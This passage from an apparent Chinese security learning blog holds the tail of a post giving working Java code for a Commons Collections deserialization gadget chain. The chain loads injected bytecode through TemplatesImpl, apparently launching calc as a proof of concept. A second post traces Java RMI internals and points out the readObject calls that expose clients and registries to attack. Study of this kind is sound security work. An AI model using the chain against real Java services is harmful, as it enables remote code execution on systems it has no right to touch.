class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)&#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);<span class="comment">//前面是利用的cc3的</span></span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);<span class="comment">//后面稍微改一下</span></span><br><span class="line"></span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformerField=c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,chainedTransformer);</span><br><span class="line">        <span class="type">byte</span> [] bytes=serialize(priorityQueue);</span><br><span class="line">        unserialize(bytes);</span><br></pre></td></tr></table></figure>

<p>理所当然没有执行</p>
<p><img src="/images/image-20220406182025803.png" alt="image-20220406182025803"></p>
<p>可以看到要想循环需要size大于二，咱们就向里面放两个。就完成了。我们可以用cc4修改一下，组成一个没有数组构成的cc2。用InvokerTransformer直接获得newTransformer就不用利用TrAXFilter.class来链接了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;</span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAPTHRlc3QvQ0MzL3Rlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEADXRlc3QvQ0MzL3Rlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAALAAQADgANABEAEAAPABEAEAAVABMADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;);</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(obj);</span><br><span class="line">        priorityQueue.add(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformerField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformerField.setAccessible(true);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        byte [] bytes=serialize(priorityQueue);</span><br><span class="line">        unserialize(bytes);     </span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>关于Rmi</title>
    <url>/2023/07/30/%E5%85%B3%E4%BA%8ERmi/</url>
    <content><![CDATA[<p>[TOC]</p>
<p>最近几天一真在看rmi的一些东西，想着记录下来也让自己的记得更深一点</p>
<p>个人能力有限，记录下来也是为了让自己忘得慢一点，看见写的不好地方就当图一乐。</p>
<p>那么我们开始吧。</p>
<h3 id="1、什么是rmi"><a href="#1、什么是rmi" class="headerlink" title="1、什么是rmi"></a>1、什么是rmi</h3><p>RMI (Remote Method Invocation) 远程方法调用，顾名思义远程方法调用。在java中如果想要调用远程方法通常使用java原生反序列化，并且结合动态类加载和安全管理器来传输一个完整的java类。</p>
<p>那么RMI是怎么实现的呢。</p>
<p>RMI 中有三个重要的角色：注册中心（Registry）、客户端（Client）、服务端（Server）。</p>
<p>在rmi中需要先进行服务注册，客户端从注册中心获取服务，服务端向注册中心注册远程对象。为了屏蔽网络通讯的复杂性，rmi提出了（stub）客户端存根和(Skeleton)服务端骨架两个概念，客户端和服务端的网络通讯都通过stub和skeleton进行。文字一大堆不如一个图，偷一个 。如下图：<img src="/images/image-20230730173140687.png" alt="image-20230730173140687"></p>
<h4 id="1-1、先写一个demo来简单了解一下整个流程"><a href="#1-1、先写一个demo来简单了解一下整个流程" class="headerlink" title="1.1、先写一个demo来简单了解一下整个流程"></a>1.1、先写一个demo来简单了解一下整个流程</h4><p>想要使用rmi服务首先要定义一个远程调用的接口，这个接口必须拓展<code>java.rmi.Remote</code>接口,用来远程调用的对象作为这个接口的实例，也将实现这个接口，为这个接口生成的代理（Stub）也是如此。</p>
<p><img src="/images/image-20230730174511263.png" alt="image-20230730174511263"></p>
<p>下面我们来写我们真正要远程调用的实现类<code>RemoteObjImpl</code>，这里是真正实现代码逻辑的地方，这里一般会扩展<code>java.rmi.server.UnicastRemoteObject</code> 类，扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 <code>equals/hashcode/toString</code> 方法。这里必须为这个实现类提供一个构造函数并且抛出 RemoteException。</p>
<p><img src="/images/image-20230730174716331.png" alt="image-20230730174716331"></p>
<p>然后我们将实现类绑定到注册中心上，注册中心由<code>java.rmi.registry</code>实现，代码实现如下</p>
<p><img src="/images/image-20230730175336654.png" alt="image-20230730175336654"></p>
<p>现在我们已经将实现类绑定到registry上了，下面我们就应该在客户端去调用远程对象。代码如下，具体的代码干什么的我就都不再赘述了。</p>
<p><img src="/images/image-20230730181611802.png" alt="image-20230730181611802"></p>
<p>运行结果</p>
<p><img src="/images/image-20230730181707227.png" alt="image-20230730181707227"></p>
<p>这样一次简单的远程调用通信就完成了。</p>
<h3 id="2、源码分析"><a href="#2、源码分析" class="headerlink" title="2、源码分析"></a>2、源码分析</h3><p>下面我们对流程进行具体的分析</p>
<h4 id="2-1-服务注册"><a href="#2-1-服务注册" class="headerlink" title="2.1.服务注册"></a>2.1.服务注册</h4><h5 id="①-远程对象创建"><a href="#①-远程对象创建" class="headerlink" title="① 远程对象创建"></a>① 远程对象创建</h5><p>我们创建了一个远程对象<code>RemoteObjImpl remoteObj = new RemoteObjImpl();</code>这个对象继承了 UnicastRemoteObject，这个类用于使用 JRMP 协议 export 远程对象，并获取与远程对象进行通信的 Stub。让我们具体的跟一些流程。（这里我用的jdk版本1.8.65）</p>
<p>在初始化时，会创建一个 UnicastServerRef 对象，并调用其 <code>exportObject</code> 方法来 export RemoteObject 这个远程对象。</p>
<p><img src="/images/image-20230730191023654.png" alt="image-20230730191023654"></p>
<p><img src="/images/image-20230730191104038.png" alt="image-20230730191104038"></p>
<p>下面我们跟进去康康<code>UnicastServerRef</code>是什么根据描述</p>
<p><img src="/images/image-20230730191535118.png" alt="image-20230730191535118"></p>
<p>应该只是确定端口的一个封装。跳出来跟进<code>UnicastRemoteObject</code>中的exportObject,此时传入的是一个封装好的unicastServerRef，封装有LiveRef对象，在LiveRef里又有封装好的TCPEndpoint</p>
<p><img src="/images/image-20230730192252538.png" alt="image-20230730192252538"></p>
<p>赋完值后又调用<code>UnicastServerRef.exportObject</code></p>
<p>走到exportObject里面又调用<code>createProxy</code></p>
<p><img src="/images/image-20230730192721545.png" alt="image-20230730192721545"></p>
<p>这其中使用 <code>sun.rmi.server.Util#createProxy()</code> 方法使用 RemoteObjectInvocationHandler 来为我们产生写的 RemoteObject 实现的 RemoteInterface 接口创建动态代理。</p>
<p><img src="/images/image-20230730193823195.png" alt="image-20230730193823195"></p>
<p>然后起了一个线程。</p>
<p><img src="/images/image-20230730194005582.png" alt="image-20230730194005582"></p>
<p>然后创建 <code>sun.rmi.transport.Target</code> 对象，用 Target 对象封装了我们远程执行方法和生成的动态代理类（Stub）。<code>Target可以理解为是一个远程服务实例，一个Target对应一个远程对象。里面保存了远程对象实例、对应的Stub、对应的远程引用对象UnicastServerRef，之前创建的LiveRef的ObjID。实际上Target就是用LiveRef的ObjID代表了这个远程对象，一个远程对象和一个LiveRef是绑定的。这里就包括了远程调用所需的全部对象了，远程调用就是Stub使用远程引用来调用远程对象上的方法。</code></p>
<p><img src="/images/image-20230730194156907.png" alt="image-20230730194156907"></p>
<p>这里一直在封装我们的ref。然后调用 <code>LiveRef#exportObject</code> 接着调用 <code>sun.rmi.transport.tcp.TCPEndpoint#exportObject</code> 监听本地端口。</p>
<p><img src="/images/image-20230730210204417.png" alt="image-20230730210204417"></p>
<p><img src="/images/image-20230730210147653.png" alt="image-20230730210147653"></p>
<p>现在已经获得端口了，现在回到<code>TCPTransport.exportObject</code>继续执行，会执行TCPTransport 的 exportObject 方法</p>
<p><img src="/images/image-20230730210506328.png" alt="image-20230730210506328"></p>
<p>LiveRef、TCPEndoPint、TCPTransport是处理网络通信的类。UnicastRef、UnicastServerRef是远程对象的引用对象，是宏观上处理网络请求的类，也是实现RMI调用的核心逻辑的类。UnicastRemoteObject就是远程对象的基础类，它并不直接处理网络请求，而是通过里面的UnicastServerRef处理。</p>
<p>将 Target 实例注册到 ObjectTable 中。ObjectTable 用来管理所有发布的服务实例 Target，ObjectTable 提供了根据 ObjectEndpoint 和 Remote 实例两种方式查找 Target 的方法（不同参数的 getTarget 方法）。</p>
<p><img src="/images/image-20230730210702811.png" alt="image-20230730210702811"></p>
<p>上述的流程可以大致简单总结成一张图</p>
<p><img src="/images/image-20230730210744659.png" alt="image-20230730210744659"></p>
<p>这就是整个的远程对象RemoteObjImpl的创建过程，中间比较乱的地方是创建了一大堆对象，互相包含又互相引用。大概描述一下：<br>最外层对象是Target，里面保存了远程对象、远程对象的代理对象stub、远程对象的引用对象UnicastServerRef、还有代表这个对象的ObjID。<br>而远程对象里也保存了服务端远程引用对象UnicastServerRef，stub里保存了一个客户端远程引用UnicastRef，这两个引用里实际都保存了同一个LiveRef对象，里面保存了远程对象对应的ip和端口。<br>而服务端上还有一个ObjectTable，每创建一个远程对象，就会把对应的Target保存到里面。目前已经创建了两个远程对象，分别是自定义远程对象和系统内置远程对象DGCImpl。</p>
<h5 id="②远程对象创建"><a href="#②远程对象创建" class="headerlink" title="②远程对象创建"></a>②远程对象创建</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure>

<p>七拐八拐到了unicastServerRef中，这里我们似曾相识，前面都是一样的，只是端口不一样，这里会进入setSkeleton中<img src="/images/image-20230730231021224.png" alt="image-20230730231021224"></p>
<p>进入了util的createSkeleton</p>
<p><img src="/images/image-20230730231924849.png" alt="image-20230730231924849"></p>
<p>反射生成了sun.rmi.registry.RegistryImpl_Skel，接下来和之前一样了，创建Target然后发布。最后把Target放到ObjectTable里面，目前里面有RemoteObjImpl的Stub和RegistryImpl_Stub，还有个DGCImpl_Stub。</p>
<p>这里忽略了DGCImpl_Stub.，在创建完target后又调用liveRef.exportObject。里面调用了一系列的exportObject</p>
<p><img src="/images/image-20230730232540105.png" alt="image-20230730232540105"></p>
<p>在将把对象和target绑定，放进ObjectTable这个类的静态变量objTable里面。的方法中调用触发了DGCImpl类的实例化。这是垃圾回收相关的类，跟进static代码块</p>
<p>发现和我们之前的调用过程的类似的</p>
<p><img src="/images/image-20230730232825798.png" alt="image-20230730232825798"></p>
<p>使用单例模式创建了一个DGCImpl对象，这个对象就是RMI的分布式垃圾处理对象，一旦有远程对象被创建，就会实例化这个对象，但也只会创建这一次。后面的代码和UnicastServerRef#exportObject里很像，创建一个代理。但这里和前面不同的是这是一个系统内置类，所以是直接创建了DGCImpl_Stub类，而不是创建的动态代理。并且设置了disp的skeleton是DGCImpl_Skel。最后同样把这些放进Target，把Target保存进ObjectTable。</p>
<h5 id="③绑定远程对象到注册中心"><a href="#③绑定远程对象到注册中心" class="headerlink" title="③绑定远程对象到注册中心"></a>③绑定远程对象到注册中心</h5><p>好了下面让我们康康怎么绑定远程对象到注册中心</p>
<p><img src="/images/image-20230730233215562.png" alt="image-20230730233215562"></p>
<p>把名字和对象放在一个bindings里面，就完了。</p>
<h4 id="2-2、客户端获取远程"><a href="#2-2、客户端获取远程" class="headerlink" title="2.2、客户端获取远程"></a>2.2、客户端获取远程</h4><h5 id="1-获取注册中心远程对象"><a href="#1-获取注册中心远程对象" class="headerlink" title="1.获取注册中心远程对象"></a>1.获取注册中心远程对象</h5><p>下面开始客户端获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</span><br></pre></td></tr></table></figure>

<p>通过host和端口创建了一个LiveRef</p>
<p><img src="/images/image-20230731222923822.png" alt="image-20230731222923822"></p>
<p>然后用LiveRef创建了一个UnicastRef，最后调用了Util.createProxy根据前面分析这里创建的是一个RegistryImpl_Stub对象。和服务端不同的是这里的ref是一个UnicastRef而不是UnicastServerRef，因为一个对应客户端一个对应服务端。最后创建了这个RegistryImpl_Stub对象，接下来通过它去查找注册中心中的远程对象。</p>
<p>然后</p>
<p><code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code></p>
<p>先进入newCall发起一个请求和注册中心建立连接。</p>
<p><img src="/images/image-20230731224003512.png" alt="image-20230731224003512"></p>
<p>然后调用UnicastRef#invoke</p>
<p><img src="/images/image-20230731224438359.png" alt="image-20230731224438359"></p>
<p>然后进入StreamRemoteCall#executeCall</p>
<p>executeCall作用是发起网络调用，和服务端进行通信并获取结果，执行executeCall此时也触发了服务端监听线程的run方法，需要注意的是当服务端返回异常时，会对输入流调用readObject</p>
<p><img src="/images/image-20230731225800649.png" alt="image-20230731225800649"></p>
<p>现在正常的我们往下走，出来之后又是一个反序列化点，</p>
<p><img src="/images/image-20230731225957678.png" alt="image-20230731225957678"></p>
<p>对我们从正常中心获取的数据流进行反序列化，如果我们控制注册中心返回恶意数据流，那么如果注册中心可控，客户端lookup注册中心的时候就会被攻击。</p>
<h4 id="2-3、获取注册中心远程对象-注册中心端"><a href="#2-3、获取注册中心远程对象-注册中心端" class="headerlink" title="2.3、获取注册中心远程对象(注册中心端)"></a>2.3、获取注册中心远程对象(注册中心端)</h4><p>之前有提到，在发布远程对象的时候存在一个线程AcceptLoop线程，我们打上断点，看见会跑到断点位置。</p>
<p><img src="/images/image-20230820194602673.png" alt="image-20230820194602673"></p>
<p>调用TCPTransport#executeAcceptLoop，会开启新线程，跟进ConnectionHandler#run<img src="/images/image-20230820194638977.png" alt="image-20230820194638977"></p>
<p>进入run0，这里一大堆处理，我们直接看关键的地方handleMessages，跟进去</p>
<p><img src="/images/image-20230820194845850.png" alt="image-20230820194845850"></p>
<p>根据读取的op不同进行不同的操作，一般就是走进第一个case，跟进serviceCall</p>
<p><img src="/images/image-20230820195459661.png" alt="image-20230820195459661"></p>
<p>读取id，根据id到IbjectTable中查找对应的Target，获取Target中的远程引用disp</p>
<p><img src="/images/image-20230820195523473.png" alt="image-20230820195523473"></p>
<p>调用dispatch，然后进入oldDispatch</p>
<p><img src="/images/image-20230820195806198.png" alt="image-20230820195806198">skel.dispatch，实际上也就是根据Skel的不同调用对应的dispatch方法，那这里就会调用RegistryImpl_Skel#dispatch</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> sun.rmi.registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.rmi.MarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.UnmarshalException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Skeleton;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.SkeletonMismatchException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RegistryImpl_Skel</span> <span class="keyword">implements</span> <span class="title class_">Skeleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Operation[] operations = <span class="keyword">new</span> <span class="title class_">Operation</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> <span class="title class_">Operation</span>(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">interfaceHash</span> <span class="operator">=</span> <span class="number">4905912898345647071L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RegistryImpl_Skel</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">            String var7;</span><br><span class="line">            Remote var8;</span><br><span class="line">            ObjectInput var10;</span><br><span class="line">            ObjectInput var11;</span><br><span class="line">            <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Operation[] getOperations() &#123;</span><br><span class="line">        <span class="keyword">return</span> (Operation[])operations.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先简单分析，可以看到下面有个 switch 选择，其中分了很多 case，不同的 case 对应的是不同的方法调用。但多个 case 里面都涉及到了 readObject 的调用，所以就很明显存在反序列化了。如果此次传的是恶意对象就有可能威胁到注册中心。</p>
<h4 id="2-4、远程方法调用-客户端"><a href="#2-4、远程方法调用-客户端" class="headerlink" title="2.4、远程方法调用(客户端)"></a>2.4、远程方法调用(客户端)</h4><p>分析完了在注册中心查找远程对象的部分，接下来分析最后一行</p>
